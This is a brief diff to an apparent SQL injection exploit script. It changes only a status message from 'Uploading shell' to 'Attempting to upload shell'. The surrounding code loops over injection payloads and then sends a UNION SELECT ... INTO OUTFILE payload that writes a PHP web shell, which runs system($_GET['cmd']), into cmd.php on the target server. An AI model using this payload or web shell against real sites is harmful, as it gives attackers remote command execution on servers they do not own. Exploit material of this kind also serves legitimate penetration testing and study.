@@ -53,7 +53,7 @@ def main():
     for payload in payloads:
         exploit(url, args.param, payload)
 
-    print("[+] Uploading shell to server...\n")
+    print("[+] Attempting to upload shell to server...\n")
     payload = "' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile './cmd.php' #"
     exploit(url, args.param, payload)
 
